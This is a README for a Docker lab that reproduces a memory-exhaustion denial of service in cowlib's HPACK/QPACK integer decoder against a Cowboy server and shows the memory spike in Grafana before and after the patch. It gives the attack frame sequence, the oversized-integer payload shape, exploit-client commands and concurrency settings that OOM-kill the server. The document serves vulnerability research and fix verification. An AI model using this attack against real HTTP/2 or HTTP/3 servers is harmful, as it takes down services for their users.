# cowlib HPACK/QPACK integer-decoder DoS — reproducible lab with observability

## The CVE

A resource-limitation vulnerability in ninenines **cowlib** (≥ 2.0.0,
< 2.19.0) lets an **unauthenticated remote HTTP/2 or HTTP/3 peer exhaust
memory** on the vulnerable server (or client) and cause a **denial of
service**.

The HPACK and QPACK prefixed-integer decoder
`cow_hpack_common:dec_big_int/3` (`src/cow_hpack_common.hrl`, invoked from
`cow_hpack:decode/2` and `cow_qpack:decode_field_section/3`) reads
continuation octets until it finds one whose high bit is clear, evaluating
`Int + (Value bsl M)` at each step with the shift `M` growing by **7 per
octet**. There is **no limit** on the number of continuation octets, on the
resulting bit width, or on the value — the decoder consumes whatever encoded
length the peer supplies. Because Erlang integers are immutable, every
intermediate `Value bsl M` and every accumulator update allocates a fresh
bignum whose digit width grows linearly with the octets processed so far;
summed over the whole decode, the transient allocation is **O(n²)** in the
encoded length.

A single maximal HPACK indexed representation carried in one HTTP/2
**HEADERS + CONTINUATION** frame pair — within Cowboy's default
`max_frame_size_received` — can force **hundreds of megabytes** of transient
allocation and garbage-collection churn before the resulting header-table
index is rejected as invalid. Repeated or concurrent connections multiply
the pressure and can drive the Erlang VM to memory exhaustion.

Cowlib is the HTTP parser used by **Cowboy**, **RabbitMQ's management
plugin**, and other Erlang/Elixir HTTP/2 and HTTP/3 servers and clients, so
any exposed endpoint that accepts HPACK or QPACK from an untrusted peer is
reachable.

**Fix:** cowlib **2.19.0** adds a `when M < 32` guard to `dec_big_int/3`,
rejecting oversized integers after a handful of octets.

This lab replays the attack (preface → SETTINGS → HEADERS → CONTINUATION
with an oversized `0xFF…` HPACK integer) against a real Cowboy server and
captures the BEAM memory spike in Prometheus/Grafana — before and after
applying the patch.

## Architecture

```
 exploit-client ──HTTP/2 (h2c)──▶ cowboy-server (cowboy 2.17.0 / cowlib 2.18.0, :8080)
                                    │  /metrics  (same listener)
                                    ▼
                                prometheus (:9090) ──scrape 2s──▶ grafana (:3000)
```

Cowboy pins an exact cowlib version: **cowboy 2.17.0 ships the vulnerable
cowlib 2.18.0** (cowboy 2.18.0 bundles the fixed cowlib 2.19.0). This lab
forces cowlib with `override: true` so the vuln→fix demonstration is a
one-line change in `server/mix.exs`.

| Service            | URL                                              |
|--------------------|--------------------------------------------------|
| Cowboy server      | `http://localhost:8080/` (HTTP/1.1 + HTTP/2 h2c) |
| Server /metrics    | `http://localhost:8080/metrics`                  |
| Prometheus         | `http://localhost:9090/targets`                  |
| Grafana            | `http://localhost:3000` (admin / admin)          |

The Grafana dashboard **"cowlib 2.18.0 HPACK memory DoS"** is auto-provisioned
(no manual data-source or panel setup).

## Usage

```bash
# 1. Build images and start the server + observability stack
docker compose build
docker compose up -d cowboy-server prometheus grafana

# 2. Sanity checks
curl http://localhost:8080/               # -> OK
curl http://localhost:8080/metrics | grep erlang_vm_memory_processes_bytes_total

# 3. Let ~15s of baseline accumulate, then launch the concurrent exploit
#    (default: 5 concurrent connections, each with a ~200KB HPACK bomb)
docker compose run --rm exploit-client

# 4. Watch the spike (the server stays up after the attack)
docker stats cowboy-server                # live CLI view — memory + CPU
# Grafana: open http://localhost:3000 (admin/admin) — dashboard auto-provisioned.
#   Panel 1 "ERLANG VM: Process memory"  = BEAM process heaps only (the decoder)
#   Panel 2 "ERLANG VM: Total memory"    = system + processes allocator memory
#   Panel 3 "CONTAINER: cgroup memory"   = cowboy_container_memory_{used,peak,limit}
# NOTE: the first two panels only see the BEAM's own accounting, which peaks at
# ~150-200 MiB. `docker stats` shows the whole cgroup (allocator carriers, code,
# binaries, page cache), which reaches ~1 GiB — panel 3 reports that exact
# number, so it tracks `docker stats` one-for-one.
# Observed spike (100 conn × 512KB): processes_used 16 → 153 MiB (9×),
# container memory 87 → 256 MiB.

# To push the server to full OOM denial of service:
docker compose run --rm -e NUM_CONCURRENT=800 exploit-client
# (NUM_CONCURRENT=1500 drives container memory to the 1g limit even faster)
# Server is killed (exit 137) in ~10 seconds; restart with:
docker compose up -d cowboy-server

# If the server has already died, Prometheus simply stops getting scrapes, so
# Grafana's lines end at the crash. Set the dashboard time range to "Last 15
# minutes" to see the recorded climb; the peak is also kept in
# cowboy_container_memory_peak_bytes until the container restarts.
# The exploit service has `profiles: ["attack"]`, so `docker compose up -d`
# never auto-launches the attack.

# 5. Verify the fix: in server/mix.exs change
#        {:cowlib, "2.18.0", override: true}
#    to
#        {:cowlib, "2.19.0", override: true}
#    then rebuild and restart just the server (the memory line stays flat):
#    docker compose build cowboy-server && docker compose up -d cowboy-server
#    docker compose run --rm exploit-client

# 6. Tear down (the -v flag removes volumes, incl. Grafana dashboards)
docker compose down -v
```

> **Ports:** the stack publishes host `8080` (Cowboy), `9090` (Prometheus),
> `3000` (Grafana). Ensure these are free before starting, and re-run the
> exploit client with `docker compose run --rm` each time — the Compose
> service runs once and exits.

### Attack tuning (env vars on the client)

| Variable                | Default | Effect                                                    |
|-------------------------|---------|-----------------------------------------------------------|
| `PAYLOAD_CONTINUATIONS` | `524288` | number of `0xFF` octets in the HPACK integer (512 KB bomb; server's `max_fragmented_header_block_size` allows up to 1 MB). |
| `NUM_CONCURRENT`        | `100`   | concurrent async connections — each stays alive decoding for `ATTACK_KEEPALIVE_SECS`. Increase to 200+ to reliably OOM (cross `1g`) the server container. |
| `SOCKET_TIMEOUT`        | `15`    | seconds for each connection handshake                  |
| `ATTACK_KEEPALIVE_SECS` | `60`    | how long each connection stays alive after sending     |
| `SERVER_HOST` / `SERVER_PORT` | `cowboy-server` / `8080` | target                    |

```bash
# single connection probe (fast, minimal effect):
docker compose run --rm -e PAYLOAD_CONTINUATIONS=50000 -e NUM_CONCURRENT=1 -e ATTACK_KEEPALIVE_SECS=10 exploit-client
# visible spike, server survives (~60 connections, 512KB each):
docker compose run --rm -e NUM_CONCURRENT=60 -e ATTACK_KEEPALIVE_SECS=25 exploit-client
# full OOM denial of service (800 connections, ~10s to exit 137):
docker compose run --rm -e NUM_CONCURRENT=800 exploit-client
# faster OOM (1500 connections):
docker compose run --rm -e NUM_CONCURRENT=1500 exploit-client
# run directly from the host (any Docker not needed):
SERVER_HOST=localhost python3 client/poc_http2.py
```

> A payload larger than the server's `max_fragmented_header_block_size`
> (1 MiB) is rejected before it reaches the decoder, and the client then sees
> `socket.send() raised exception` on the closed connection. Keep
> `PAYLOAD_CONTINUATIONS` ≤ ~1,000,000 or raise the cap in
> `server/poc_server.exs` (and rebuild) to match.

## Library-level PoC (`server/poc.exs`)

`poc.exs` exercises `:cow_hpack.decode/2` directly — no TCP, no port binding —
so it can run next to the live server or on its own. It feeds
`0xFF + 0xFF×N + 0x00` to a decoder process with a `max_heap_size` cap and
logs progress while the integer is being shifted.

```bash
# rebuild once so the file is baked into the image
docker compose build cowboy-server

# run it (safe while cowboy-server is up — it binds nothing)
docker compose run --rm cowboy-server mix run poc.exs
# or inside the running container:
docker compose exec cowboy-server mix run poc.exs
```

| Variable                | Default   | Effect                                                    |
|-------------------------|-----------|-----------------------------------------------------------|
| `PAYLOAD_CONTINUATIONS` | `100000`  | number of `0xFF` octets                                   |
| `HEAP_WORDS`            | `1000000` | child heap cap in words (8 B each)                        |
| `SAMPLE_MS`             | `50`      | heap/memory sampling interval                             |
| `LOG_EVERY`             | `5`       | log every Nth sample (`1` = all)                          |
| `TIMEOUT_MS`            | `30000`   | hard cap on the decode                                    |
| `VERBOSE`               | `1`       | `0` summary, `1` sampled, `2` every sample                 |

Abridged output (cowlib 2.18.0):

```
[poc] cowlib 2.18.0 — HPACK oversized-integer decoder test
[poc] config: continuations=100000 heap_words=1000000 (7.6MiB cap) sample=50ms
[poc] payload: 100001 bytes (100000 0xFF octets + 0x00)
[poc] baseline: vm_total=53.3MiB cgroup=97.7MiB
[poc] decoder pid=#PID<0.216.0> started
[poc] t+9ms   heap=200540w mem=1.5MiB reductions=1540382
[poc] t+775ms heap=211688w mem=1.6MiB reductions=22901707
[poc] t+2305ms heap=229920w mem=1.8MiB reductions=66772672
[poc] decoder down after 2586ms: error :function_clause at :lists.nth/2
[poc] VERDICT: VULNERABLE — decoder walked the full O(n²) shift chain, then failed at :lists.nth/2 on the huge index
```

Two regimes, both vulnerable:

```bash
# full O(n²) shift chain (2-3 s, sampled progress, fails on the huge index)
docker compose run --rm cowboy-server mix run poc.exs

# immediate heap-limit kill (a few ms, no ramp)
docker compose run --rm -e HEAP_WORDS=50000 cowboy-server mix run poc.exs
#   [poc] decoder down after 5ms: killed (max_heap_size exceeded)
#   [poc] VERDICT: VULNERABLE — ...
```

`max_heap_size` is evaluated when a GC starts, so a small cap kills the child
before any sample is taken; the large default cap lets the decode run long
enough to log a ramp. With cowlib 2.19.0 the same command reports
`VERDICT: PATCHED` (the `M < 32` guard rejects the integer after a few
octets, decode time drops to milliseconds).

## Report notes

- **Attack path:** valid HTTP/2 client preface → SETTINGS → HEADERS
  (no `END_HEADERS`) → CONTINUATION (one per `MAX_FRAME_PAYLOAD` block,
  `END_HEADERS` on the last) carrying the
  `0xFF + 0xFF×N + 0x00` indexed-header integer, sent **concurrently**
  across many connections.

- **Memory signatures (two regimes):**

  | Config | Processes‑used | Container (cgroup) | CPU | Server outcome |
  |--------|----------------|--------------------|-----|----------------|
  | 5 conn × 196 KB | 17.4 → 39.5 MiB (+126%) | 94 → 130 MiB | 475–607% | Stays up |
  | 60 conn × 512 KB | 16 → ~145 MiB | 86 → ~250 MiB | ~500% | Stays up |
  | 800 conn × 512 KB | 130 → 970+ MiB | 248 → 970 MiB | 560% | **OOM-killed** (exit 137) |
  | 1500 conn × 512 KB | — | ~1 GiB (limit) | saturated | **OOM-killed** (exit 137) |

  The moderate loads show a clear, recoverable spike. The aggressive loads
  drive the VM to **memory exhaustion** in ~10 seconds — the cgroup OOM
  killer terminates the container, fully demonstrating the DoS.

  Panel 3 (`cowboy_container_memory_used_bytes`) reads cgroup v2
  `memory.current` minus `inactive_file`, i.e. the same figure as
  `docker stats`, so Grafana and the CLI agree during the whole ramp.

- **Patch effect (cowlib 2.19.0):** the `when M < 32` guard on
  `dec_big_int/3` rejects the oversized integer after 5 continuation octets.
  The same attack produces **no memory change** and CPU stays under 15%.

- **Process-level detail:** during the attack,
  `docker exec -it cowboy-server bash`, then use `recon`/`observer` to inspect
  the Cowboy connection process heap (`recon:proc_count(memory, 10)`) — the
  decoder's bignum churn is visible there.
